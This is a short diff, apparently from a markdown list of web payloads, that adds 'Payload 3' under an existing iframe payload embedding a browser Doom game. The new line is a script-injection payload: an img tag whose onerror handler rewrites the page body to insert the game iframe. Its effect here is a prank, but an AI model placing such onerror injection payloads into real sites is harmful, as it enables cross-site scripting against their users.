@@ -108,6 +108,9 @@ document.getElementsByTagName('body')[0].innerHTML = `
 
 #Payload 2
 <iframe title="Doom" width="500" height="400" src="https://emupedia.net/emupedia-game-doom1/asmjs/"></iframe>
+
+#Payload 3
+<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
 ```
 
 ---
